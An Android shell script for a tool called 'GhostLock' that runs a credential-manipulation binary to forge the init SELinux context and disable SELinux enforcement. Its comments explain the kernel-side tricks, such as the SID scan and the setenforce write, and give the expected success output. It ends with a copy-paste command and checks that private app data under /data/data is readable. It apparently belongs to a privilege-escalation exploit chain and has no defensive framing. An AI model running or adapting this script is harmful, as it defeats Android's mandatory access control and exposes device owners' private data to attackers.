#!/system/bin/sh
#
# GhostLock - SELinux enforce probe (Phase A.1)   [device-side script]
#
# Run this from an interactive adb shell on the device, with the freshly
# built binary already at /data/local/tmp/ghostlock:
#
#   adb push ghostlock /data/local/tmp/ghostlock
#   adb shell chmod 755 /data/local/tmp/ghostlock
#   adb shell -t
#   sh /data/local/tmp/test_enforce.sh
#
# What the env vars do:
#   GHOST_SID_ANY=1                 force current_sid() through cred->security
#                                   (bypasses the "must be shell" check)
#   GHOST_SID_SCAN_CTX=u:r:init:s0  locate the init domain by its context
#   GHOST_SID_SCAN_SETENFORCE=1     for each plausible privileged domain, try
#                                   `echo 0 > /sys/fs/selinux/enforce`
#   GHOST_SELINUX=0                 mode 6 (cred only). Deliberately do NOT
#                                   zero selinux_state: that clears
#                                   ->initialized and breaks binder's
#                                   security_secid_to_secctx (-EINVAL).
#
# Expected output lines:
#   sid: SCAN 2..4096 for u:r:init:s0 +setenforce-probe
#   sid: SIDHIT 74 ctx=u:r:init:s0
#   sid: ENFORCE_OK <sid> ctx=<domain>     -> success, enforcing is now 0
#   sid: ENFORCE_NONE (no privileged domain has security:security setenforce)
#   sid: restore shell SID=<sid>
#
# NOTE: the write to /sys/fs/selinux/enforce requires
#       security:security setenforce (NOT the selinuxfs file permission),
#       which is why init (SID 74) fails with EACCES on write even though
#       its open(O_WRONLY) succeeds.
#
# The actual command is on ONE line below so it is easy to copy/paste.

cd /data/local/tmp && GHOST_SID_ANY=1 GHOST_SID_SCAN_CTX=u:r:init:s0 GHOST_SID_SCAN_SETENFORCE=1 GHOST_SELINUX=0 ./ghostlock --cred

# --- optional verification after the run (each on one line) ---
# getenforce
# cat /sys/fs/selinux/enforce
# ls /data/data | head
# pm list packages | head
# dmesg | grep -c 'initial load_policy'
